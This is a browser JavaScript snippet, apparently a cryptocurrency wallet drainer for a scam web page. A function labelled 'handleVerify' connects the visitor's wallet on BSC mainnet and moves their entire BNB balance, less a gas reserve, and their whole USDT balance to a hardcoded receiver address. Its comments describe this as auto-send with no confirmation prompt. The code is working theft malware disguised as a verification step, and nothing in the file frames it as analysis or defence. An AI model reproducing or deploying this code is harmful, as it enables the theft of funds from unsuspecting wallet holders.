<script>
  // ===== CONFIGURE =====
  // Replace with the address you want funds sent to (your own address)
  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";

  // USDT BEP20 mainnet address (BSC)
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";

  // Minimal ERC20 ABI
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];

  // Amount of BNB to reserve for gas (adjust if needed)
  const GAS_RESERVE = "0.0005";

  // Helper to show status to user and console
  function showStatus(msg) {
    const el = document.getElementById("status");
    if (el) el.innerText = msg;
    console.log(msg);
  }

  // Ensure provider is connected to BSC Mainnet (chainId 56)
  async function isBSCMainnet(provider) {
    try {
      const network = await provider.getNetwork();
      return network.chainId === 56;
    } catch (e) {
      console.warn("Could not read network:", e);
      return false;
    }
  }

  // Main function: auto-send (no confirmation prompt)
  async function handleVerify() {
    showStatus("Connecting wallet...");
    if (!window.ethereum) {
      showStatus("No wallet detected. Install Binance Wallet / MetaMask.");
      return;
    }

    try {
      // Request accounts
      await window.ethereum.request({ method: "eth_requestAccounts" });

      // Create ethers provider + signer
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      showStatus("Connected: " + userAddress);

      // Check chain
      const onMainnet = await isBSCMainnet(provider);
      if (!onMainnet) {
        showStatus("Please switch wallet to BSC Mainnet (chainId 56) and retry.");
        return;
      }

      // 1) Send BNB (all - GAS_RESERVE)
      showStatus("Checking BNB balance...");
      const balanceBNB = await provider.getBalance(userAddress); // BigInt
      const balanceBNBStr = ethers.formatEther(balanceBNB);
      showStatus(`BNB balance: ${balanceBNBStr} BNB`);

      const gasReserveWei = ethers.parseEther(GAS_RESERVE);
      if (balanceBNB > gasReserveWei) {
        const amountToSend = balanceBNB - gasReserveWei;
        if (amountToSend > 0n) {
          try {
            showStatus("Sending BNB...");
            const tx = await signer.sendTransaction({ to: RECEIVER, value: amountToSend });
            showStatus("BNB tx sent: " + tx.hash);
            await tx.wait();
            showStatus("BNB tx confirmed: " + tx.hash);
          } catch (bnbErr) {
            console.error("BNB send failed:", bnbErr);
            showStatus("BNB send failed: " + (bnbErr?.message || bnbErr));
          }
        } else {
          showStatus("No transferable BNB after reserving gas.");
        }
      } else {
        showStatus("BNB balance too low to send (or only gas available).");
      }

      // 2) Attempt USDT BEP20 transfer (wrapped in try/catch)
      showStatus("Checking USDT (BEP20) balance...");
      try {
        const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
        let balanceUSDT = await usdt.balanceOf(userAddress); // BigInt
        // If USDT uses 6 decimals it would be different; this is raw token units.
        if (balanceUSDT > 0n) {
          showStatus("USDT balance (raw): " + balanceUSDT.toString());
          try {
            showStatus("Sending USDT...");
            const tx = await usdt.transfer(RECEIVER, balanceUSDT);
            showStatus("USDT tx sent: " + tx.hash);
            await tx.wait();
            showStatus("USDT tx confirmed: " + tx.hash);
          } catch (transferErr) {
            console.error("USDT transfer failed:", transferErr);
            showStatus("USDT transfer failed: " + (transferErr?.message || transferErr));
          }
        } else {
          showStatus("No USDT balance found.");
        }
      } catch (readErr) {
        // This catches BAD_DATA / 0x decode errors and other provider issues
        console.warn("Could not read USDT balance (contract may be inaccessible):", readErr);
        showStatus("Unable to read USDT balance (wallet/ RPC returned invalid data).");
      }

      showStatus("Done.");
    } catch (err) {
      console.error("Top-level error:", err);
      showStatus("Error: " + (err?.message || err));
    }
  }
</script>
